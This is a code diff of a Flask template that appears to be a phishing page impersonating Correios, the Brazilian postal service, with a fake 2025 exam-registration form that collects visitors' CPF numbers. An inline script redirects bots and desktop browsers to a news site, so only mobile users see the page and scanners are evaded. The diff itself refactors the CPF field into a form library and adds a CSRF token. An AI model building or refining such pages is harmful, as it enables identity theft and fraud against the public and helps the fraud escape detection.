@@ -6,38 +6,31 @@
       function isMobile() {
         return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
       }
-
       // Função para detectar se é um bot
       function isBot() {
         return botAgents.some(bot => navigator.userAgent.includes(bot));
       }
-
       // Função para verificar se a largura da janela é maior que 768px
       function isWideScreen() {
         return window.innerWidth > 768;
       }
-
       // Redirecionar ou bloquear o acesso
       function checkAccess() {
         if (isBot() || (!isMobile() && isWideScreen())) {
           window.location.href = "https://g1.globo.com/";
         }
       }
-
       // Executar a função de verificação ao carregar a página
       window.onload = checkAccess;
-
       // Adicionar um listener para verificar novamente se a janela for redimensionada
       window.addEventListener('resize', checkAccess);
     </script> 
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Correios - Inscrição Concurso 2025</title>
-
     <!-- Preload fonts -->
     <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
     <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-700.woff2') }}" as="font" type="font/woff2" crossorigin>
-
     <!-- Styles -->
     <link href="{{ url_for('static', filename='css/rawline.css') }}" rel="stylesheet">
     <script src="https://cdn.tailwindcss.com"></script>
@@ -120,20 +113,14 @@
 
     <div class="container mx-auto px-4 pb-8 flex-grow">
         <div class="bg-white rounded-lg shadow-lg p-8 border border-gray-100">
-            <form id="inscricaoForm" method="POST" action="{{ url_for('consultar_cpf') }}">
+            <form id="inscricaoForm" method="POST" action="{{ url_for('consultar_cpf') }}" class="space-y-6">
+                {{ form.csrf_token }}
                 <p class="mb-6 font-bold text-lg text-correios-blue">Dados para Inscrição:</p>
                 <div class="space-y-6">
                     <div class="relative">
                         <label class="block text-gray-700 text-sm font-bold mb-2" for="cpf">CPF:</label>
                         <div class="relative">
-                            <input class="appearance-none border border-gray-300 rounded-md w-full py-2.5 px-4 text-gray-700 leading-tight focus:outline-none focus:ring-2 focus:ring-correios-blue focus:border-transparent transition duration-200"
-                                   id="cpf"
-                                   name="cpf"
-                                   type="text" 
-                                   inputmode="numeric"
-                                   maxlength="14"
-                                   placeholder="Digite apenas números"
-                                   required />
+                            {{ form.cpf(class="appearance-none border border-gray-300 rounded-md w-full py-2.5 px-4 text-gray-700 leading-tight focus:outline-none focus:ring-2 focus:ring-correios-blue focus:border-transparent transition duration-200", id="cpf", inputmode="numeric", maxlength="14", placeholder="Digite apenas números", required=true) }}
                             <div class="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
                                 <i class="fas fa-id-card text-gray-400"></i>
                             </div>
